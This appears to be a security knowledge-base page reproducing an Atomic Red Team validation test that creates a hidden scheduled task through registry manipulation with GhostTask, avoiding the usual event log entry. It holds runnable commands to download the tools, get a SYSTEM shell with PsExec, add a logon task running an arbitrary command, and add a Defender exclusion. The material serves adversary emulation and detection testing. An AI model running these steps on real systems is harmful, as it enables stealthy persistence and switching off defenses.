---
atomic_guid: "704333ca-cc12-4bcf-9916-101844881f54"
title: "Scheduled Task (\"Ghost Task\") via Registry Key Manipulation"
framework: "atomic"
generated: "true"
attack_technique_id: "T1053.005"
attack_technique_name: "Scheduled Task/Job: Scheduled Task"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "704333ca-cc12-4bcf-9916-101844881f54"
  - "Scheduled Task (\"Ghost Task\") via Registry Key Manipulation"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Scheduled Task ("Ghost Task") via Registry Key Manipulation

Create a scheduled task through manipulation of registry keys. This procedure is implemented using the [GhostTask](https://github.com/netero1010/GhostTask) utility. By manipulating registry keys under HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree, the tool creates user-specified scheduled tasks without a corresponding Windows Event 4698, which is logged when scheduled tasks are created through conventional means.
This requires a download of the GhostTask binary, which must be run as NT Authority\SYSTEM. Upon successful execution of this test, a scheduled task will be set to run at logon which launches notepad.exe or runs a user-specified command.
For further exploration of this procedure and guidance for hunting and detection, see [Hunting G-G-G-GhostTasks!](https://medium.com/p/154b50ab6a78).

## Metadata

- Atomic GUID: 704333ca-cc12-4bcf-9916-101844881f54
- Technique: T1053.005: Scheduled Task/Job: Scheduled Task
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1053.005/T1053.005.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1053-scheduled_task_job|T1053.005]]

## Input Arguments

### target

- description: System where the task should run
- type: string
- default: localhost

### task_command

- description: Command you want the task to execute
- type: string
- default: notepad.exe

### task_name

- description: Name of the newly-added task
- type: string
- default: lilghostie

### user_name

- description: Username to authenticate with, such as ATOMICDOMAIN\AtomicAdmin
- type: string
- default: $env:USERDOMAIN + '\' + $env:USERNAME

## Dependencies

PsExec tool from Sysinternals must exist in the ExternalPayloads directory

### Prerequisite Check

```powershell
if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe") { exit 0} else { exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"
Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools" -Force
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe" "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -Force
```

GhostTask.exe tool from netero101 must exist in the ExternalPayloads directory. This tool may be quarantined by windows defender; disable windows defender real-time protection to fix it or add the ExternalPayloads directory as an exclusion, using a command like `Add-MpPreference -ExclusionPath "PathToAtomicsFolder\..\ExternalPayloads\"`

### Prerequisite Check

```powershell
if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe") { exit 0} else { exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/netero1010/GhostTask/releases/download/1.0/GhostTask.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe"
```

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
"PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\#{target} -accepteula -s "cmd.exe"
"PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe" \\#{target} add #{task_name} "cmd.exe" "/c #{task_command}" #{user_name} logon
```

### Cleanup

```cmd
"PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\#{target} -accepteula -s "cmd.exe"
"PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe" \\#{target} delete #{task_name} > nul
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.yaml)
